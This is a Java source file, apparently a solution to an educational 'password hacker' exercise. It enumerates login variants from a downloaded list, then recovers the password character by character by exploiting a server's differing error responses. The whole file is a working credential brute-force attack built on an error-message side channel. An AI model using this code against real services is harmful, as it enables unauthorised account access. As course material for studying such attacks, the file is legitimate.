package hacker;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;

import java.io.*;
import java.net.Socket;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.Scanner;

public class Main {
    public static void main(String[] args) {
        try (Socket socket = new Socket(args[0], Integer.parseInt(args[1]));
             DataInputStream input = new DataInputStream(socket.getInputStream());
             DataOutputStream output = new DataOutputStream(socket.getOutputStream())) {

            String abc = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";

            String trueLogin = "";
            String truePassword = "";
            boolean isDone = false;

            URL url = new URL("https://stepik.org/media/attachments/lesson/255258/logins.txt");
            Scanner sc = new Scanner(url.openStream(), StandardCharsets.UTF_8);

            GsonBuilder gsonBuilder = new GsonBuilder();
            Gson gson = gsonBuilder.setPrettyPrinting().create();

            while (sc.hasNextLine() && trueLogin.isEmpty()) {
                String login = sc.nextLine();
                List<String> variants = getVariants(login);
                for (String variant : variants) {
                    Request request = new Request(variant, "");
                    String jsonRequest = gson.toJson(request);
                    output.writeUTF(jsonRequest);
                    String receivedMsg = input.readUTF();
                    Response response = gson.fromJson(receivedMsg, Response.class);
                    if (Objects.equals(response.result, "Wrong password!")) {
                        trueLogin = variant;
                        break;
                    }
                }
            }

            while (!isDone) {
                for (int i = 0; i < abc.length(); i++) {
                    String password = truePassword + abc.charAt(i);
                    Request request = new Request(trueLogin, password);
                    String jsonRequest = gson.toJson(request);
                    output.writeUTF(jsonRequest);
                    String receivedMsg = input.readUTF();
                    Response response = gson.fromJson(receivedMsg, Response.class);
                    if (Objects.equals(response.result, "Connection success!")) {
                        System.out.println(jsonRequest);
                        isDone = true;
                        break;
                    }
                    if (Objects.equals(response.result, "Exception happened during login")) {
                        truePassword = password;
                        break;
                    }
                }
            }

        } catch (IOException ignored) {
        }
    }

    private static List<String> getVariants(String pass) {
        int count = 0;
        for (int i = 0; i < pass.length(); i++) {
            char c = pass.charAt(i);
            if (Character.isLetter(c)) {
                count++;
            }
        }
        count = (int) Math.pow(2, count);

        List<String> result = new ArrayList<>();

        for (int j = 0; j < count; j++) {
            StringBuilder sb = new StringBuilder();
            String mask = Integer.toBinaryString(j);
            int index = 0;
            for (int i = 0; i < pass.length(); i++) {
                char c = pass.charAt(i);
                if (Character.isLetter(c)) {
                    if (mask.length() - index - 1 >= 0 && mask.charAt(mask.length() - index - 1) == '1') {
                        c = Character.toUpperCase(c);
                    }
                    index++;
                }
                sb.append(c);
            }
            result.add(sb.toString());
        }
        return result;
    }
}

class Request {
    String login;
    String password;

    public Request(String login, String password) {
        this.login = login;
        this.password = password;
    }
}

class Response {
    String result;
}
